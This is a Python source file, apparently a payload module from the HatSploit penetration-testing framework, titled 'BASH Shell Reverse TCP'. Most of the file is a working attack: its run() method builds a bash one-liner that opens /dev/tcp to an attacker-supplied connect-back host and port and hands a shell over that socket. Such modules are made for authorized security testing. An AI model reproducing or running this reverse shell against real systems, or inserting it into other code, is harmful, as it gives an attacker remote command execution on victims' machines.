#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

import random

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "single",
        'Name': "BASH Shell Reverse TCP",
        'Payload': "unix/generic/bash_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "BASH shell reverse TCP payload.",
        'Architecture': "generic",
        'Platform': "unix",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        connback_host = self.handler['CBHOST']
        connback_port = self.handler['CBPORT']

        fd = random.randint(0, 200)
        payload = f"bash -c '0<&{fd}-;exec {fd}<>/dev/tcp/{connback_host}/{connback_port};sh <&{fd} >&{fd} 2>&{fd}' &"

        return payload
